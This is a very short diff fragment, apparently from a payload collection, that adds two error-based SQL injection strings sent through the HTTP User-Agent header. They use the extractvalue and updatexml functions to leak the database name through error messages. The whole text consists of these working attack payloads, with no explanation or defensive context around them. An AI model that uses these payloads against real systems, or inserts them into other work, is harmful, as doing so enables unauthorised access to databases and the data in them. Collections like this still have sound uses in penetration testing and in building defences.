@@ -1,0 +1,3 @@
+User-Agent: ' or extractvalue(1,concat(0x7e,database())) or '
+OR
+User-Agent: ' and updatexml(1,concat(0x7e,(select database()),0x7e),1) and '1'='1
